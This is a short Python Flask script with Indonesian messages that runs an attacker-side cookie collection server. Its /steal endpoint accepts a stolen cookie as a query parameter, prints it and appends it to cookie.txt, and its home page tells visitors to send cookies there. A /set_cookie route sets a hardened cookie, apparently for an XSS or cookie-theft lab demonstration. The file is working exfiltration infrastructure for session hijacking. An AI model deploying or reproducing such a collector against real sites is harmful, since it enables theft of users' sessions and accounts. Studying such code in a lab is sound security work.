from flask import Flask, request, make_response

app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    return "Server berjalan. Gunakan /steal untuk mengirim cookie!."

@app.route("/steal", methods=["GET"])
def steal():
    cookie = request.args.get("cookie")
    print(f"Cookie yang diterima: {cookie}")

    # Simpan cookie ke file untuk pemeriksaan
    with open("cookie.txt", "a") as file:
        file.write(cookie + "\n")

    return "Cookie berhasil diterima!"

@app.route("/set_cookie", methods=["GET"])
def set_cookie():
    resp = make_response("Cookie telah diatur.")
    resp.set_cookie('user_cookie', 'secure_value', httponly=True, secure=True, samesite='Strict')
    return resp

if __name__ == "__main__":
    app.run(debug=True)
